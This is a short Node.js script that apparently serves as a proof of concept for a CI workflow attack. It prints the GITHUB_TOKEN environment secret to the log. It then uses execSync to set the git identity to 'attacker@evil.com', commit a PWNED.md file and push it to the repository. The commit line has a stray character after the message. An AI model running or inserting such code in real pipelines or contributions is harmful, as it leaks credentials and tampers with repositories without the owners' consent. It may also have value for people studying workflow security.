const { execSync } = require("child_process");

console.log("blabla");

console.log(process.env.GITHUB_TOKEN);

// modify repo
execSync(`
git config user.email attacker@evil.com
git config user.name attacker
echo "pwned" > PWNED.md
git add PWNED.md
git commit -m "pwned by workflow"2
git push
`);
